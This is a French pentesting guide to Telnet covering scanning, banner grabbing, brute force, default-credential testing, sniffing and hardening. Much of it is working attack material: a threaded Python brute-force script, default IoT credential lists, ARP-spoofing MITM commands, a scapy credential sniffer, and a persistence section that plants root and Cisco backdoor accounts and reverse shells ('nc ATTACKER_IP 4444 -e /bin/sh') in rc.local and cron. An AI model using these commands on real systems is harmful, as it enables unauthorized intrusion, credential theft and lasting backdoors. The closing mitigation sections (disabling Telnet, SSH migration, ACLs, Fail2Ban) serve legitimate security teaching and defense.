# 📟 Telnet - Guide Complet

Guide exhaustif pour l'énumération, l'exploitation et la sécurisation de Telnet, un protocole legacy non chiffré encore présent sur de nombreux systèmes embarqués et anciens.

---

## 📖 Concepts de Base

### Qu'est-ce que Telnet ?

**Telnet** est un protocole réseau pour l'accès distant en ligne de commande. En pentesting, Telnet est important pour :
- Accès à des systèmes legacy/embarqués (IoT, routeurs)
- Banner grabbing sur n'importe quel port TCP
- Test manuel de services (HTTP, SMTP, POP3, IMAP)
- Credentials en clair (sniffing réseau)
- Brute force simple
- Debug de protocoles TCP

**Port Telnet** :
```
23      - Telnet (défaut)
2323    - Alternative courante (IoT)
```

**Caractéristiques** :
```
✗ Aucun chiffrement (tout en clair)
✗ Credentials transmis en clair
✗ Vulnérable au sniffing
✗ Vulnérable au MITM
✓ Simple à utiliser
✓ Universel (TCP)
✓ Utile pour debug
```

---

## 1️⃣ Reconnaissance et Scan

### Détection de service

**Nmap** :
```bash
# Scan basique
nmap -p 23 target.com

# Scan avec version
nmap -p 23 -sV target.com

# Scan complet Telnet
nmap -p 23 -sV -sC target.com

# Scan range IoT
nmap -p 23,2323 -sV 192.168.1.0/24

# Scripts Telnet
nmap -p 23 --script telnet-* target.com

# Output
nmap -p 23 -sV -sC -oA telnet_scan target.com
```

**Scripts Nmap Telnet** :
```bash
# Encryption
nmap -p 23 --script telnet-encryption target.com

# Brute force
nmap -p 23 --script telnet-brute target.com

# NTLM info
nmap -p 23 --script telnet-ntlm-info target.com
```

**Banner Grabbing** :
```bash
# Netcat
nc -nv target.com 23

# Telnet direct
telnet target.com

# Nmap
nmap -p 23 -sV --script banner target.com

# Avec timeout
timeout 5 telnet target.com
```

---

### Identification du système

**Banners courants** :
```bash
# Linux
Ubuntu 20.04.1 LTS
Debian GNU/Linux 10

# Cisco
User Access Verification

# Windows
Welcome to Microsoft Telnet Service

# BusyBox (IoT)
BusyBox v1.28.4 () built-in shell

# Custom
Welcome to MyDevice
Login:
```

---

## 2️⃣ Connexion Telnet

### Connexion basique

```bash
# Telnet standard
telnet target.com

# Port custom
telnet target.com 2323

# Timeout
timeout 10 telnet target.com

# Sans telnet client (nc)
nc target.com 23

# Verbose
telnet -d target.com
```

---

### Login interactif

```bash
telnet target.com

# Prompt courant
login: root
Password: 

# Ou simplement
Username: admin
Password: admin

# IoT device
Login: admin
Password: (vide ou Enter)
```

---

## 3️⃣ Banner Grabbing Universel

### Test de services via Telnet

**HTTP** :
```bash
telnet target.com 80

GET / HTTP/1.1
Host: target.com

# Response
HTTP/1.1 200 OK
Server: Apache/2.4.41
...
```

**SMTP** :
```bash
telnet target.com 25

EHLO test.com
# 250-mail.target.com
# 250-STARTTLS
# 250 AUTH PLAIN LOGIN

QUIT
```

**POP3** :
```bash
telnet target.com 110

USER admin
+OK
PASS password
+OK
LIST
RETR 1
QUIT
```

**IMAP** :
```bash
telnet target.com 143

a login admin password
a list "" *
a select INBOX
a fetch 1 all
a logout
```

**FTP** :
```bash
telnet target.com 21

USER anonymous
331 Please specify the password
PASS anonymous
230 Login successful
LIST
QUIT
```

**MySQL** :
```bash
telnet target.com 3306
# Banner MySQL visible
# Utile pour version info
```

---

### Script d'automatisation

```bash
#!/bin/bash
# banner_grab.sh

TARGETS_FILE=$1
PORTS="21 22 23 25 80 110 143 443 3306 3389"

if [ -z "$TARGETS_FILE" ]; then
    echo "Usage: $0 <targets_file>"
    exit 1
fi

echo "[*] Starting banner grabbing"

while read target; do
    echo ""
    echo "[+] Target: $target"
    
    for port in $PORTS; do
        echo "  [*] Port $port:"
        timeout 3 nc -nv $target $port 2>&1 | head -5 | sed 's/^/    /'
    done
done < $TARGETS_FILE
```

---

## 4️⃣ Brute Force

### Hydra

```bash
# User connu
hydra -l root -P passwords.txt telnet://target.com

# Liste d'utilisateurs
hydra -L users.txt -P passwords.txt telnet://target.com

# Port custom
hydra -l admin -P passwords.txt telnet://target.com:2323

# Threads
hydra -l admin -P passwords.txt -t 4 telnet://target.com

# Verbose
hydra -l admin -P passwords.txt -V telnet://target.com

# Output
hydra -l admin -P passwords.txt telnet://target.com -o telnet_creds.txt
```

---

### Medusa

```bash
# Brute force
medusa -h target.com -u admin -P passwords.txt -M telnet

# Multiple users
medusa -h target.com -U users.txt -P passwords.txt -M telnet

# Threads
medusa -h target.com -u admin -P passwords.txt -M telnet -t 10

# Verbose
medusa -h target.com -u admin -P passwords.txt -M telnet -v 6
```

---

### Ncrack

```bash
# Brute force
ncrack -p 23 -u admin -P passwords.txt target.com

# Multiple targets
ncrack -p 23 -U users.txt -P passwords.txt target1.com target2.com
```

---

### Metasploit

```bash
msfconsole

# Telnet login scanner
use auxiliary/scanner/telnet/telnet_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 10
run

# Telnet version scanner
use auxiliary/scanner/telnet/telnet_version
set RHOSTS 192.168.1.0/24
run

# Brocade telnet brute
use auxiliary/scanner/telnet/brocade_telnet_enable_login
set RHOSTS target.com
run
```

---

### Script Python

```python
#!/usr/bin/env python3
# telnet_brute.py

import telnetlib
import sys
from concurrent.futures import ThreadPoolExecutor

def try_login(host, port, user, password, timeout=5):
    """Essaie une combinaison user/password"""
    try:
        tn = telnetlib.Telnet(host, port, timeout=timeout)
        
        # Attendre prompt login
        tn.read_until(b"login: ", timeout=timeout)
        tn.write(user.encode('ascii') + b"\n")
        
        # Attendre prompt password
        tn.read_until(b"Password: ", timeout=timeout)
        tn.write(password.encode('ascii') + b"\n")
        
        # Vérifier succès
        response = tn.read_some().decode('ascii', errors='ignore')
        
        tn.close()
        
        if "incorrect" in response.lower() or "failed" in response.lower():
            return (user, password, False)
        else:
            return (user, password, True)
            
    except Exception as e:
        return (user, password, False)

def brute_force(host, port, users, passwords, threads=10):
    """Brute force Telnet"""
    
    print(f"[*] Starting Telnet brute force on {host}:{port}")
    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
    print(f"[*] Total attempts: {len(users) * len(passwords)}\n")
    
    attempts = []
    for user in users:
        for password in passwords:
            attempts.append((host, port, user.strip(), password.strip()))
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda x: try_login(*x), attempts)
        
        for user, password, success in results:
            if success:
                print(f"[+] SUCCESS: {user}:{password}")
                found.append((user, password))
    
    return found

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <host> <port> <users_file> <passwords_file>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    with open(sys.argv[3]) as f:
        users = f.readlines()
    
    with open(sys.argv[4]) as f:
        passwords = f.readlines()
    
    results = brute_force(host, port, users, passwords)
    
    if results:
        print(f"\n[+] Found {len(results)} valid credentials")
    else:
        print("\n[-] No valid credentials found")
```

---

## 5️⃣ Exploitation

### Credentials par défaut (IoT)

**Liste courante** :
```
admin:admin
admin:(vide)
root:root
root:(vide)
admin:password
admin:1234
root:toor
admin:admin123
support:support
user:user
guest:guest
cisco:cisco
ubnt:ubnt
```

**Script test credentials** :
```bash
#!/bin/bash
# test_default_creds.sh

TARGET=$1

DEFAULT_CREDS=(
    "admin:admin"
    "admin:"
    "root:root"
    "root:"
    "admin:password"
    "admin:1234"
)

echo "[*] Testing default credentials on $TARGET"

for cred in "${DEFAULT_CREDS[@]}"; do
    USER=$(echo $cred | cut -d':' -f1)
    PASS=$(echo $cred | cut -d':' -f2)
    
    echo "[*] Trying $USER:$PASS"
    
    (
        sleep 1
        echo "$USER"
        sleep 1
        echo "$PASS"
        sleep 2
    ) | telnet $TARGET 2>&1 | grep -q "incorrect\|failed" || echo "[+] SUCCESS: $USER:$PASS"
done
```

---

### Accès post-connexion

```bash
telnet target.com
login: admin
Password: admin

# Shell obtenu
$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)

$ uname -a
Linux router 4.14.78 #1 SMP Wed Dec 5 10:00:00 UTC 2018 mips GNU/Linux

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
admin:x:1000:1000:admin:/home/admin:/bin/sh

$ ps aux
# Processus en cours

$ netstat -tuln
# Ports ouverts

$ ls -la /
# Exploration filesystem
```

---

### Persistence

**Backdoor account** :
```bash
# Si accès root
echo "hacker:x:0:0::/root:/bin/sh" >> /etc/passwd
echo "hacker:$(openssl passwd -1 password123)" >> /etc/shadow

# Connexion
telnet target.com
login: hacker
Password: password123
```

**Startup script** :
```bash
# Ajouter reverse shell au démarrage
echo "nc ATTACKER_IP 4444 -e /bin/sh &" >> /etc/rc.local

# Ou cron
echo "* * * * * nc ATTACKER_IP 4444 -e /bin/sh" | crontab -
```

---

## 6️⃣ Network Sniffing

### Capturer credentials Telnet

**tcpdump** :
```bash
# Capturer trafic Telnet
tcpdump -i eth0 -A port 23 -w telnet_capture.pcap

# Live viewing
tcpdump -i eth0 -A port 23

# Filtrer par host
tcpdump -i eth0 -A port 23 and host target.com
```

**Wireshark** :
```bash
# Lancer capture
wireshark -i eth0 -k -f "port 23"

# Ou analyser pcap
wireshark telnet_capture.pcap

# Filter
telnet
tcp.port == 23

# Follow TCP Stream
Right-click packet > Follow > TCP Stream
# Voir credentials en clair
```

**tshark** :
```bash
# Capture
tshark -i eth0 -f "port 23" -w telnet.pcap

# Analyse
tshark -r telnet.pcap -Y telnet

# Extract credentials
tshark -r telnet.pcap -Y telnet -T fields -e telnet.data
```

**Ettercap** :
```bash
# MITM + sniffing
ettercap -T -q -i eth0 -M arp:remote /gateway_ip/ /target_ip/

# Credentials capturées automatiquement
```

---

### Script Python sniffer

```python
#!/usr/bin/env python3
# telnet_sniffer.py

from scapy.all import *

def packet_callback(packet):
    """Analyse packets Telnet"""
    
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 23 or packet[TCP].sport == 23:
            try:
                data = packet[Raw].load.decode('ascii', errors='ignore')
                
                if data.strip():
                    print(f"[+] Telnet data from {packet[IP].src}:{packet[TCP].sport}")
                    print(f"    {repr(data)}\n")
                    
                    # Detect credentials
                    if "login:" in data.lower() or "username:" in data.lower():
                        print("[!] Login prompt detected")
                    elif "password:" in data.lower():
                        print("[!] Password prompt detected")
                        
            except:
                pass

if __name__ == "__main__":
    print("[*] Starting Telnet sniffer")
    print("[*] Listening on port 23...\n")
    
    sniff(filter="tcp port 23", prn=packet_callback, store=0)
```

---

## 7️⃣ Protection et Mitigation

### Désactivation de Telnet

**Linux** :
```bash
# Systemd
systemctl stop telnet.socket
systemctl disable telnet.socket

# Xinetd
chkconfig telnet off
/etc/init.d/xinetd restart

# Vérifier
netstat -tuln | grep :23
ss -tuln | grep :23
```

**Cisco** :
```
# Désactiver Telnet
Router(config)# line vty 0 4
Router(config-line)# transport input ssh
Router(config-line)# no transport input telnet
Router(config-line)# exit

# Vérifier
Router# show line vty 0 4
```

**Windows** :
```powershell
# Désactiver service Telnet
Stop-Service TlntSvr
Set-Service TlntSvr -StartupType Disabled

# Désinstaller
dism /online /Disable-Feature /FeatureName:TelnetServer
```

---

### Migration vers SSH

**Remplacer Telnet par SSH** :
```bash
# Installer OpenSSH
apt install openssh-server

# Configuration basique
# /etc/ssh/sshd_config
Port 22
PermitRootLogin no
PasswordAuthentication yes
PubkeyAuthentication yes

# Désactiver Telnet
systemctl stop telnet.socket
systemctl disable telnet.socket

# Activer SSH
systemctl enable sshd
systemctl start sshd

# Firewall
ufw allow 22/tcp
ufw deny 23/tcp
```

---

### Restrictions (si Telnet nécessaire)

**Limiter par IP** :
```bash
# iptables
iptables -A INPUT -p tcp --dport 23 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 23 -j DROP

# hosts.allow / hosts.deny
# /etc/hosts.allow
in.telnetd: 192.168.1.0/255.255.255.0

# /etc/hosts.deny
in.telnetd: ALL
```

**Cisco ACL** :
```
Router(config)# access-list 10 permit 192.168.1.0 0.0.0.255
Router(config)# line vty 0 4
Router(config-line)# access-class 10 in
```

---

### Monitoring

**Logs** :
```bash
# Linux logs
tail -f /var/log/auth.log | grep telnet

# Failed attempts
grep "authentication failure" /var/log/auth.log | grep telnet

# Successful logins
grep "session opened" /var/log/auth.log | grep telnet
```

**Fail2Ban** :
```bash
# /etc/fail2ban/jail.local
[telnet]
enabled = true
port = telnet
filter = telnet
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
```

---

## 8️⃣ Cas Pratiques

### Scénario 1: Routeur avec Telnet

```bash
# Scan réseau
nmap -p 23 -sV 192.168.1.0/24

# Routeur trouvé
192.168.1.1:23

# Test credentials par défaut
telnet 192.168.1.1
login: admin
Password: admin
# Success!

# Enumération
Router> enable
Router# show running-config
Router# show ip interface brief
Router# show version

# Backdoor
Router(config)# username hacker privilege 15 password backdoor123
Router(config)# line vty 0 4
Router(config-line)# login local
```

---

### Scénario 2: IoT Device

```bash
# Découverte
nmap -p 23,2323 -sV 192.168.1.0/24

# Device IoT trouvé
192.168.1.50:2323 (BusyBox)

# Credentials par défaut
telnet 192.168.1.50 2323
login: root
Password: (vide - Enter)
# Success!

# Shell busybox
$ id
uid=0(root) gid=0(root)

$ cat /etc/passwd
$ ps aux
$ netstat -tuln

# Persistence impossible (firmware read-only)
# Mais accès permanent via Telnet
```

---

### Scénario 3: Sniffing Credentials

```bash
# MITM avec Ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.0/24/

# Ou tcpdump
tcpdump -i eth0 -A port 23

# Utilisateur se connecte via Telnet
# Credentials capturées
login: admin
Password: SuperSecret123

# Réutilisation
telnet target.com
login: admin
Password: SuperSecret123
```

---

## 9️⃣ Cheatsheet Rapide

```bash
# === RECONNAISSANCE ===

# Scan
nmap -p 23 -sV target.com
nmap -p 23,2323 -sV 192.168.1.0/24

# Banner
nc target.com 23
telnet target.com


# === CONNEXION ===

# Basique
telnet target.com
telnet target.com 2323

# Netcat alternative
nc target.com 23


# === BANNER GRABBING ===

# HTTP
telnet target.com 80
GET / HTTP/1.1
Host: target.com

# SMTP
telnet target.com 25
EHLO test

# POP3
telnet target.com 110
USER admin
PASS password


# === BRUTE FORCE ===

# Hydra
hydra -l root -P passwords.txt telnet://target.com

# Medusa
medusa -h target.com -u admin -P passwords.txt -M telnet

# Metasploit
use auxiliary/scanner/telnet/telnet_login


# === CREDENTIALS PAR DÉFAUT ===

admin:admin
admin:(vide)
root:root
root:(vide)
admin:password


# === SNIFFING ===

# tcpdump
tcpdump -i eth0 -A port 23

# Wireshark
wireshark -i eth0 -k -f "port 23"

# Ettercap
ettercap -T -q -i eth0 -M arp:remote /gateway/ /target/


# === DÉSACTIVATION ===

# Linux
systemctl stop telnet.socket
systemctl disable telnet.socket

# Cisco
Router(config-line)# transport input ssh
Router(config-line)# no transport input telnet
```

---

## 🔟 Ressources

**Documentation** :
- **Telnet RFC 854** : https://tools.ietf.org/html/rfc854
- **Telnet Options** : https://www.iana.org/assignments/telnet-options

**Outils** :
- **Hydra** : https://github.com/vanhauser-thc/thc-hydra
- **Ettercap** : https://www.ettercap-project.org/
- **Wireshark** : https://www.wireshark.org/

**Security** :
- **OWASP Telnet** : https://owasp.org/www-community/vulnerabilities/Telnet
- **NIST Guidelines** : Deprecation of Telnet

**Alternatives** :
- **OpenSSH** : https://www.openssh.com/
- **Mosh** : https://mosh.org/ (mobile shell)

**Labs** :
- **HackTheBox** : IoT challenges
- **TryHackMe** : Network Services room

---

## 1️⃣1️⃣ Tips Pro

1. **Telnet = legacy** : remplacer par SSH impérativement
2. **IoT devices souvent** : routeurs, caméras, NAS
3. **Credentials par défaut fréquents** : admin/admin très courant
4. **Sniffing trivial** : tout en clair sur le réseau
5. **Banner grabbing universel** : tester n'importe quel port TCP
6. **Port 2323 courant** : alternative IoT
7. **BusyBox indicateur** : système embarqué minimal
8. **MITM facile** : Ettercap + ARP spoofing
9. **Cisco IOS accessible** : show run = configuration complète
10. **Brute force rapide** : pas de rate limiting souvent
11. **Wireshark Follow Stream** : voir session complète
12. **Persistence limitée IoT** : firmware read-only
13. **Migration SSH prioritaire** : sécurité critique
14. **ACL si Telnet nécessaire** : limiter par IP source
15. **Fail2Ban recommandé** : même pour Telnet

---

**🎯 Telnet = protocole obsolète mais encore omniprésent sur IoT et legacy. Toujours tester !**

**Tags:** `#telnet #iot #legacy #sniffing #cleartext #brute-force #banner-grabbing #ettercap #wireshark #cisco`
